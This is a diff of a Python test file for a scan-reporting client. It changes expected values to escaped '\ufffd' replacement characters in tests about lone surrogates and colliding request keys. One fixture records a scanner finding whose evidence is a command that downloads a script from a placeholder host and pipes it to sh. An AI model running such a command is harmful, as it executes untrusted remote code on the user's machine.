@@ -594,10 +594,10 @@ def test_a_request_never_carries_a_lone_surrogate_and_the_local_report_is_unchan
     raw = fake.raw_bodies[0]
     sent = json.loads(raw.decode("utf-8"))
     assert b"\\udc" not in raw.lower()
-    assert sent["report"]["findings"][0]["location"]["path"] == "skills/x�/run.sh"
-    assert sent["report"]["findings"][0]["evidence"] == "curl https://get.example.com/� | sh"
-    assert sent["run"]["changed"] == ["skills/x�/run.sh", "a�.md"] and sent["k�"] == "v"
-    assert "�" in sent["report"]["notices"][0]["message"]
+    assert sent["report"]["findings"][0]["location"]["path"] == "skills/x\ufffd/run.sh"
+    assert sent["report"]["findings"][0]["evidence"] == "curl https://get.example.com/\ufffd | sh"
+    assert sent["run"]["changed"] == ["skills/x\ufffd/run.sh", "a\ufffd.md"] and sent["k\ufffd"] == "v"
+    assert "\ufffd" in sent["report"]["notices"][0]["message"]
     assert fake.requests[1][1] == "/api/v1/orgs/acme/ci/policy?scope=skills%2Fx%EF%BF%BD&k%EF%BF%BD=v"
     assert body == before and report.findings[0].finding.location.path == path
 
@@ -606,4 +606,4 @@ def test_request_keys_that_clean_to_the_same_name_both_reach_the_service():
     fake, _, client, _ = build(key=Secret(credential("swk")))
     fake.script("POST", "/api/v1/orgs/acme/ci/scans", 201, {"scan": "s1"})
     client.post("/v1/orgs/acme/ci/scans", {"paths": dict([("a\udcff", 1), ("a\udcfe", 2)])}, retry=False)
-    assert list(json.loads(fake.raw_bodies[0].decode("utf-8"))["paths"].items()) == [("a�", 1), ("a��", 2)]
+    assert list(json.loads(fake.raw_bodies[0].decode("utf-8"))["paths"].items()) == [("a\ufffd", 1), ("a\ufffd\ufffd2", 2)]
